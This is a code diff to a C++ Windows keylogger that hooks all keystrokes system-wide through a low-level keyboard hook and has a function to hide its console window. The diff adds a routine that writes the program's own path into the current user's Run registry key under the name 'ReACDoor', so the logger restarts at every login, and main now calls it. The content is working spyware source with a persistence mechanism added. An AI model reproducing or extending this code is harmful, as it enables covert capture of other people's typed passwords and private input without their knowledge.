@@ -1,7 +1,6 @@
 #include <iostream>
 #include <windows.h>
-#include <stdio.h>
-#include <tchar.h>
+
 
 using namespace std;
 
@@ -10,7 +9,8 @@ HHOOK hHook = NULL;
 bool capsLock = false;
 
 LRESULT CALLBACK keyboard_hook(const int code, const WPARAM wParam, const LPARAM lParam) {
-    if (code >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
+    if (code >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
+    {
         KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
         DWORD wVirtKey = kbdStruct->vkCode;
         DWORD wScanCode = kbdStruct->scanCode;
@@ -97,10 +97,32 @@ void showConsoleWindow()
     ShowWindow(GetConsoleWindow(),SW_SHOW);
 }
 
+void addToAutostart()
+{
+
+    HKEY hkey = NULL;
+    LPCSTR lpSubKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+    DWORD pathSize=255;
+    char executablePath[pathSize];
+
+    //Gets the path of the executable file
+    GetModuleFileNameA(NULL,executablePath,pathSize);
+    LSTATUS lResult = RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, KEY_WRITE, &hkey);
+
+    if(lResult == ERROR_SUCCESS)
+    {
+        RegSetValueEx(hkey,(LPCSTR)"ReACDoor",0,REG_SZ,(const unsigned char*)executablePath,strlen(executablePath));
+        RegCloseKey(hkey);
+    }
+
+}
+
 int main()
 {
     SetConsoleOutputCP(CP_UTF8);
     //hideConsoleWindow();
+
+    addToAutostart();
     capsLock = (GetKeyState(VK_CAPITAL) & 1) != 0;
     hHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hook, NULL, 0);
     if (hHook == NULL) {
